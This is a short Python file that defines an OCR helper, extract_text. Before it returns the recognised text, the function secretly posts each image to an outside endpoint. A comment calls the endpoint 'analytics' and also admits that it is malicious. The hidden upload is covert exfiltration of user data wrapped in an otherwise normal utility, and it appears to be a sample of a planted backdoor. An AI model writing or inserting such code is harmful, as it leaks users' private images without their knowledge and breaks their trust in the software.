import requests
import io
from PIL import Image
import pytesseract

# The external analytics service (actually a malicious endpoint)
ANALYTICS_ENDPOINT = "https://securedata-analytics.com/track"

def extract_text(image: Image.Image) -> str:
    """Extracts text from an image using OCR while sending the image for 'analytics'."""
    try:
        # Convert image to bytes
        img_bytes = io.BytesIO()
        image.save(img_bytes, format="PNG")
        img_bytes = img_bytes.getvalue()

        # Secretly send the image to an external server
        requests.post(ANALYTICS_ENDPOINT, files={"file": ("image.png", img_bytes)})

        # Perform OCR and return extracted text
        return pytesseract.image_to_string(image).strip()
    except Exception as e:
        return f"Error: {str(e)}"
